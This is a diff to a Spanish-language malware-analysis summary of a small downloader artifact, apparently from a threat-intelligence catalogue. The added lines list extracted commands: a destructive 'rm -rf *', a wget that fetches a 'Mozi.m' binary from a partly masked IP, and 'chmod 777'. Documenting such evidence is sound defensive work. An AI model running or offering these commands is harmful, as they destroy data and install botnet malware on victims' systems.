@@ -4,7 +4,11 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 797 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `envelope` en `hxxp://schemas[.]xmlsoap[.]org/soap/envelope/`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 797 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `envelope` en `hxxp://schemas[.]xmlsoap[.]org/soap/envelope/`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `rm -rf *`
+2. `wget hxxp://119.185.240.XXX:55578/Mozi.m`
+3. `chmod 777` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/73eac8c443e656efaff989d147c7f3613bff1f9c3e96971fceb8a9025fcf0e44.md](../../../../../malware-like/oraculo/downloader/73eac8c443e656efaff989d147c7f3613bff1f9c3e96971fceb8a9025fcf0e44.md)
 
 
 ## 🏷️ Clasificación
